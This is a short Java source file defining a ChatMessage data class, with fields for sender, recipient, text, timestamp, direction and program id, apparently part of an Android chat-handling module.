package com.android.networking.module.chat;

import java.util.Date;

public class ChatMessage {

	public String message;
	public Date timestamp;
	public boolean incoming;
	public int programId;
	public String from;
	public String to;

	public ChatMessage(int programId, Date timestamp, String from, String to, String message, boolean incoming) {
		this.message = message;
		this.timestamp = timestamp;
		this.incoming = incoming;
		this.programId = programId;
		this.from = from;
		this.to = to;

	}

}
